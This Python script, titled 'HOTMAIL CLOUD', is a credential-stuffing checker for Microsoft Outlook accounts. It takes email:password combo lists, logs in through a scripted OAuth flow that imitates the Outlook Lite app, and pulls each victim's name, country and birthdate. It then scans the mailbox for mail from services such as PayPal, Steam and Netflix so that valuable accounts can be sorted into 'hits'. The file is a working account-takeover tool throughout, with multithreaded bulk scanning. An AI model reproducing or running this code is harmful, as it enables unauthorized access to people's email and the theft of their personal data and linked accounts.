import requests
import json
import uuid
import re
import time
from urllib.parse import quote
import os

class OutlookChecker:
    def __init__(self, keyword_file=None, debug=False):
        self.session = requests.Session()
        self.uuid = str(uuid.uuid4())
        self.debug = debug
        self.keywords = self.load_keywords(keyword_file)
        self.checked_emails = set()
        
        
    def load_keywords(self, keyword_file=None):
        default_keywords = [
            'noreply@id.supercell.com',
            'security@facebookmail.com',
            'security@mail.instagram.com',
            'info@account.netflix.com',
            'no-reply@spotify.com',
            'service@intl.paypal.com',
            'noreply@discord.com',
            'no-reply@roblox.com',
            'no-reply@twitch.tv',
            'noreply@epicgames.com',
            'no-reply@ea.com',
            'noreply@steampowered.com',
            'no-reply@amazon.com',
            'no-reply@youtube.com',
            'noreply@twitter.com',
            'no-reply@x.com'
        ]
        
        all_keywords = list(default_keywords)
        
        if keyword_file and os.path.exists(keyword_file):
            try:
                with open(keyword_file, 'r', encoding='utf-8') as f:
                    file_keywords = [line.strip() for line in f if line.strip()]
                    for kw in file_keywords:
                        if kw not in all_keywords:
                            all_keywords.append(kw)
            except Exception as e:
                pass
        
        return all_keywords
        
    def log(self, message):
        if self.debug:
            print(f"[DEBUG] {message}")
    
    def save_to_file(self, filename, content):
        try:
            existing_lines = set()
            if os.path.exists(filename):
                with open(filename, 'r', encoding='utf-8') as f:
                    existing_lines = set(line.strip() for line in f if line.strip())
            
            if content not in existing_lines:
                with open(filename, 'a', encoding='utf-8') as f:
                    f.write(content + '\n')
        except Exception as e:
            print(f"⚠️ Error saving to {filename}: {str(e)}")
        
    def check(self, email, password):
        try:
            self.log(f"Starting check: {email}")

            self.log("Step 1: Checking IDP...")
            url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
            headers1 = {
                "X-OneAuth-AppName": "Outlook Lite",
                "X-Office-Version": "3.11.0-minApi24",
                "X-CorrelationId": self.uuid,
                "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
                "Host": "odc.officeapps.live.com",
                "Connection": "Keep-Alive",
                "Accept-Encoding": "gzip"
            }

            r1 = self.session.get(url1, headers=headers1, timeout=10)
            self.log(f"IDP Response: {r1.status_code}")

            if "Neither" in r1.text or "Both" in r1.text or "Placeholder" in r1.text or "OrgId" in r1.text:
                self.log("❌ IDP check failed")
                return "❌ BAD"

            if "MSAccount" not in r1.text:
                self.log("❌ MSAccount not found")
                return "❌ BAD"

            self.log("✅ IDP check successful")

            self.log("Step 2: OAuth authorize...")
            time.sleep(1)
            
            url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
            headers2 = {
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Accept-Language": "en-US,en;q=0.9",
                "Connection": "keep-alive"
            }
            
            r2 = self.session.get(url2, headers=headers2, allow_redirects=True, timeout=10)

            url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
            ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)

            if not url_match or not ppft_match:
                self.log("❌ PPFT or URL not found")
                return "❌ BAD"

            post_url = url_match.group(1).replace("\\/", "/")
            ppft = ppft_match.group(1)

            self.log("Step 3: Login POST...")
            login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&lrt=&lrtPartition=&hisRegion=&hisScaleUnit=&passwd={password}&ps=2&psRNGCDefaultType=&psRNGCEntropy=&psRNGCSLK=&canary=&ctx=&hpgrequestid=&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&isSignupPost=0&isRecoveryAttemptPost=0&i19=9960"

            headers3 = {
                "Content-Type": "application/x-www-form-urlencoded",
                "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
                "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
                "Origin": "https://login.live.com",
                "Referer": r2.url
            }

            r3 = self.session.post(post_url, data=login_data, headers=headers3, allow_redirects=False, timeout=10)
            self.log(f"Login response: {r3.status_code}")

            if "account or password is incorrect" in r3.text or "error" in r3.text.lower():
                self.log("❌ Wrong password")
                return "❌ BAD"
            
            if "https://account.live.com/identity/confirm" in r3.text:
                return "❌ BAD | Need Verify"

            if "https://account.live.com/Abuse" in r3.text:
                return "❌ BAD | Locked"

            location = r3.headers.get("Location", "")
            if not location:
                self.log("❌ Redirect location not found")
                return "❌ BAD"

            code_match = re.search(r'code=([^&]+)', location)
            if not code_match:
                self.log("❌ Auth code not found")
                return "❌ BAD"

            code = code_match.group(1)
            self.log(f"✅ Auth code received: {code[:30]}...")

            mspcid = self.session.cookies.get("MSPCID", "")
            if not mspcid:
                self.log("❌ CID not found")
                return "❌ BAD"

            cid = mspcid.upper()
            self.log(f"CID: {cid}")

            self.log("Step 4: Getting token...")
            token_data = f"client_info=1&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D&grant_type=authorization_code&code={code}&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access"

            r4 = self.session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token",
                                   data=token_data,
                                   headers={"Content-Type": "application/x-www-form-urlencoded"},
                                   timeout=10)

            if "access_token" not in r4.text:
                self.log(f"❌ Cannot get access token")
                return "❌ BAD"

            token_json = r4.json()
            access_token = token_json["access_token"]
            self.log(f"✅ Token received")

            self.log("Step 5: Getting profile information...")
            profile_headers = {
                "User-Agent": "Outlook-Android/2.0",
                "Authorization": f"Bearer {access_token}",
                "X-AnchorMailbox": f"CID:{cid}"
            }

            r5 = self.session.get("https://substrate.office.com/profileb2/v2.0/me/V1Profile", 
                                 headers=profile_headers, timeout=10)

            if r5.status_code != 200:
                self.log(f"❌ Cannot get profile information: {r5.status_code}")
                return "❌ BAD"

            profile = r5.json()

            country = profile.get("location", "")
            name = profile.get("displayName", "")

            birth_day = profile.get("birthDay", "")
            birth_month = profile.get("birthMonth", "")
            birth_year = profile.get("birthYear", "")
            birthdate = f"{birth_day}-{birth_month}-{birth_year}" if birth_day else ""

            self.log(f"✅ Profile: {name} | {country}")

            self.log("Step 6: Getting startup data...")
            startup_headers = {
                "Host": "outlook.live.com",
                "content-length": "0",
                "x-owa-sessionid": str(uuid.uuid4()),
                "x-req-source": "Mini",
                "authorization": f"Bearer {access_token}",
                "user-agent": "Mozilla/5.0 (Linux; Android 9; SM-G975N Build/PQ3B.190801.08041932; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/91.0.4472.114 Mobile Safari/537.36",
                "action": "StartupData",
                "x-owa-correlationid": str(uuid.uuid4()),
                "ms-cv": "YizxQK73vePSyVZZXVeNr+.3",
                "content-type": "application/json; charset=utf-8",
                "accept": "*/*",
                "origin": "https://outlook.live.com",
                "x-requested-with": "com.microsoft.outlooklite",
                "sec-fetch-site": "same-origin",
                "sec-fetch-mode": "cors",
                "sec-fetch-dest": "empty",
                "referer": "https://outlook.live.com/",
                "accept-encoding": "gzip, deflate",
                "accept-language": "en-US,en;q=0.9"
            }
            
            try:
                r6 = self.session.post(f"https://outlook.live.com/owa/{email}/startupdata.ashx?app=Mini&n=0",
                                       data="", headers=startup_headers, timeout=30)

                self.log(f"Startup response: {r6.status_code}")

            except Exception as e:
                self.log(f"Startup error: {str(e)}")
                return "❌ BAD | Connection Error"

            self.log("Step 7: Checking inbox...")
            
            response_text = r6.text
            
            found_keywords = {}
            
            for keyword in self.keywords:
                count = response_text.lower().count(keyword.lower())
                if count > 0:
                    found_keywords[keyword] = count
                    self.log(f"✅ Found: {keyword} (appears {count} times)")
            
            if not found_keywords:
                self.log("🆓 No keywords found")
                result = "🆓 FREE"
                if name:
                    result += f" | {name}"
                if country:
                    result += f" | {country}"
                if birthdate and birthdate != "--":
                    result += f" | {birthdate}"
                return result

            result = "✅ HIT"
            
            keyword_summary = []
            for kw, count in found_keywords.items():
                keyword_summary.append(f"{kw} ({count})")
            result += f" | Found: {', '.join(keyword_summary)}"
            
            if name:
                result += f" | {name}"
            if country:
                result += f" | {country}"
            if birthdate and birthdate != "--":
                result += f" | {birthdate}"

            self.log(f"✅ Result: {result}")
            return result

        except requests.exceptions.Timeout:
            self.log("❌ Timeout")
            return "❌ BAD | Timeout"
        except requests.exceptions.RequestException as e:
            self.log(f"❌ Request Error: {str(e)}")
            return f"❌ BAD | Request Error"
        except Exception as e:
            self.log(f"❌ Exception: {str(e)}")
            import traceback
            self.log(traceback.format_exc())
            return f"❌ ERROR: {str(e)}"

if __name__ == "__main__":
    class Colors:
        RED = '\033[91m'
        GREEN = '\033[92m'
        YELLOW = '\033[93m'
        BLUE = '\033[94m'
        MAGENTA = '\033[95m'
        CYAN = '\033[96m'
        WHITE = '\033[97m'
        BOLD = '\033[1m'
        UNDERLINE = '\033[4m'
        END = '\033[0m'

    banner = f"""{Colors.CYAN}{Colors.BOLD}
╔═══════════════════════════════════════════════════════════════╗
║                       HOTMAIL CLOUD                           ║
╚═══════════════════════════════════════════════════════════════╝
    """

    print(banner)

    menu = f"""
{Colors.BOLD}{Colors.BLUE}┌───────────────────────────────────────────────────────────────┐
│                         MENU OPTIONS                          │
├───────────────────────────────────────────────────────────────┤
│                                                               │
│  {Colors.YELLOW}[1]{Colors.WHITE} Single Account Check       {Colors.CYAN}→ Check 1 account             {Colors.BLUE}│
│  {Colors.YELLOW}[2]{Colors.WHITE} Multi Scan - Sequential    {Colors.CYAN}→ Safe but slow               {Colors.BLUE}│
│  {Colors.YELLOW}[3]{Colors.WHITE} Multi Scan - 5 Threads     {Colors.CYAN}→ Medium speed                {Colors.BLUE}│
│  {Colors.YELLOW}[4]{Colors.WHITE} Multi Scan - 10 Threads    {Colors.CYAN}→ Fast but risky              {Colors.BLUE}│
│                                                               │
└───────────────────────────────────────────────────────────────┘{Colors.END}
    """

    print(menu)

    choice = input(f"{Colors.BOLD}{Colors.GREEN}Your choice (1/2/3/4): {Colors.END}").strip()

    keyword_file = input(f"{Colors.BOLD}{Colors.YELLOW}Enter keyword file path (press Enter for default): {Colors.END}").strip()
    if keyword_file and not os.path.exists(keyword_file):
        print(f"{Colors.YELLOW}⚠️ File not found. Using default keywords.{Colors.END}")
        keyword_file = None

    debug_input = input(f"{Colors.BOLD}{Colors.YELLOW}Enable debug mode? (y/n): {Colors.END}").strip().lower()
    debug_mode = debug_input == 'y'
    
    print()
    checker = OutlookChecker(keyword_file=keyword_file, debug=debug_mode)
    
    if keyword_file and os.path.exists(keyword_file):
        print(f"{Colors.GREEN}✅ Loaded keywords from file{Colors.END}")
    print(f"{Colors.CYAN}📌 Total keywords: {len(checker.keywords)}{Colors.END}")
    print()

    if choice == "1":
        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
        print(f"{Colors.BOLD}{Colors.MAGENTA}           SINGLE ACCOUNT CHECK{Colors.END}")
        print(f"{Colors.CYAN}{'='*80}{Colors.END}")

        email = input(f"{Colors.BOLD}{Colors.GREEN}Email: {Colors.END}").strip()
        password = input(f"{Colors.BOLD}{Colors.GREEN}Password: {Colors.END}").strip()

        print(f"\n{Colors.YELLOW}🔄 Checking...{Colors.END}\n")
        print(f"{Colors.CYAN}{'-'*80}{Colors.END}")
        result = checker.check(email, password)

        full_result = f"{email}:{password} | {result}"

        if "✅ HIT" in result:
            print(f"{Colors.GREEN}{Colors.BOLD}{full_result}{Colors.END}")
            checker.save_to_file('hits.txt', full_result)
        elif "🆓 FREE" in result:
            print(f"{Colors.YELLOW}{Colors.BOLD}{full_result}{Colors.END}")
            checker.save_to_file('free.txt', full_result)
        else:
            print(f"{Colors.RED}{Colors.BOLD}{full_result}{Colors.END}")
            checker.save_to_file('bads.txt', full_result)

        print(f"{Colors.CYAN}{'-'*80}{Colors.END}")

    elif choice in ["2", "3", "4"]:
        print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
        file_path = input(f"{Colors.BOLD}{Colors.GREEN}Enter combo file path: {Colors.END}").strip()

        try:
            with open(file_path, 'r', encoding='utf-8') as f:
                lines = f.readlines()

            if choice == "2":
                threads = 1
                mode_name = f"{Colors.BLUE}Sequential (1 Thread){Colors.END}"
            elif choice == "3":
                threads = 5
                mode_name = f"{Colors.YELLOW}5 Threads{Colors.END}"
            elif choice == "4":
                threads = 10
                mode_name = f"{Colors.RED}10 Threads{Colors.END}"

            print(f"\n{Colors.CYAN}📋 {Colors.WHITE}Found {len(lines)} accounts.{Colors.END}")
            print(f"{Colors.CYAN}🔧 Mode: {mode_name}")
            print(f"{Colors.CYAN}{'='*80}{Colors.END}")

            hits_count = 0
            bads_count = 0
            frees_count = 0

            for output_file in ['hits.txt', 'free.txt', 'bads.txt']:
                if os.path.exists(output_file):
                    os.remove(output_file)
            
            if threads == 1:
                for i, line in enumerate(lines, 1):
                    line = line.strip()
                    if not line or ':' not in line:
                        continue

                    try:
                        email, password = line.split(':', 1)
                        email = email.strip()
                        password = password.strip()

                        if email in checker.checked_emails:
                            continue
                        
                        checker.checked_emails.add(email)

                        print(f"{Colors.CYAN}[{i}/{len(lines)}]{Colors.END} {Colors.WHITE}{email}{Colors.END} checking...")
                        result = checker.check(email, password)

                        full_result = f"{email}:{password} | {result}"

                        if "✅ HIT" in result:
                            print(f"{Colors.GREEN}{Colors.BOLD}{full_result}{Colors.END}")
                            checker.save_to_file('hits.txt', full_result)
                            hits_count += 1
                        elif "🆓 FREE" in result:
                            print(f"{Colors.YELLOW}{Colors.BOLD}{full_result}{Colors.END}")
                            checker.save_to_file('free.txt', full_result)
                            frees_count += 1
                        else:
                            print(f"{Colors.RED}{full_result}{Colors.END}")
                            checker.save_to_file('bads.txt', full_result)
                            bads_count += 1

                        print(f"{Colors.CYAN}{'-'*80}{Colors.END}")
                        time.sleep(2)

                    except ValueError:
                        print(f"{Colors.RED}⚠️ Invalid format: {line}{Colors.END}")
                        continue
            else:
                import concurrent.futures
                from threading import Lock

                lock = Lock()
                results = {"completed": 0, "hits": 0, "bads": 0, "frees": 0}

                def process_account(line_data):
                    line, index = line_data
                    line = line.strip()

                    if not line or ':' not in line:
                        return

                    try:
                        email, password = line.split(':', 1)
                        email = email.strip()
                        password = password.strip()

                        with lock:
                            if email in checker.checked_emails:
                                return
                            checker.checked_emails.add(email)

                        thread_checker = OutlookChecker(keyword_file=keyword_file, debug=False)
                        result = thread_checker.check(email, password)

                        full_result = f"{email}:{password} | {result}"

                        with lock:
                            results["completed"] += 1

                            if "✅ HIT" in result:
                                print(f"{Colors.GREEN}[{results['completed']}/{len(lines)}] {email} | {result}{Colors.END}")
                                thread_checker.save_to_file('hits.txt', full_result)
                                results["hits"] += 1
                            elif "🆓 FREE" in result:
                                print(f"{Colors.YELLOW}[{results['completed']}/{len(lines)}] {email} | {result}{Colors.END}")
                                thread_checker.save_to_file('free.txt', full_result)
                                results["frees"] += 1
                            else:
                                print(f"{Colors.RED}[{results['completed']}/{len(lines)}] {email} | {result}{Colors.END}")
                                thread_checker.save_to_file('bads.txt', full_result)
                                results["bads"] += 1

                        time.sleep(1)

                    except ValueError:
                        with lock:
                            print(f"{Colors.RED}⚠️ Invalid format: {line}{Colors.END}")
                    except Exception as e:
                        with lock:
                            print(f"{Colors.RED}❌ Error: {email} - {str(e)}{Colors.END}")

                with concurrent.futures.ThreadPoolExecutor(max_workers=threads) as executor:
                    line_data = [(line, i) for i, line in enumerate(lines, 1)]
                    executor.map(process_account, line_data)
                
                hits_count = results["hits"]
                frees_count = results["frees"]
                bads_count = results["bads"]
            
            print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
            print(f"{Colors.BOLD}{Colors.MAGENTA}                    📊 RESULTS{Colors.END}")
            print(f"{Colors.CYAN}{'='*80}{Colors.END}")
            print(f"{Colors.GREEN}{Colors.BOLD}✅ HIT: {hits_count}{Colors.END}")
            print(f"{Colors.YELLOW}{Colors.BOLD}🆓 FREE: {frees_count}{Colors.END}")
            print(f"{Colors.RED}{Colors.BOLD}❌ BAD: {bads_count}{Colors.END}")
            print(f"{Colors.CYAN}{'='*80}{Colors.END}")

            if hits_count > 0:
                print(f"\n{Colors.GREEN}✅ HIT accounts saved to 'hits.txt'!{Colors.END}")

            if frees_count > 0:
                print(f"{Colors.YELLOW}🆓 FREE accounts saved to 'free.txt'!{Colors.END}")

            if bads_count > 0:
                print(f"{Colors.RED}❌ BAD accounts saved to 'bads.txt'!{Colors.END}")

        except FileNotFoundError:
            print(f"{Colors.RED}❌ File not found: {file_path}{Colors.END}")
        except Exception as e:
            print(f"{Colors.RED}❌ Error: {str(e)}{Colors.END}")

    else:
        print(f"\n{Colors.RED}❌ Invalid choice!{Colors.END}")

    print(f"\n{Colors.CYAN}{'='*80}{Colors.END}")
    print(f"{Colors.BOLD}{Colors.GREEN}✨ Completed!{Colors.END}")
    print(f"{Colors.CYAN}{'='*80}{Colors.END}")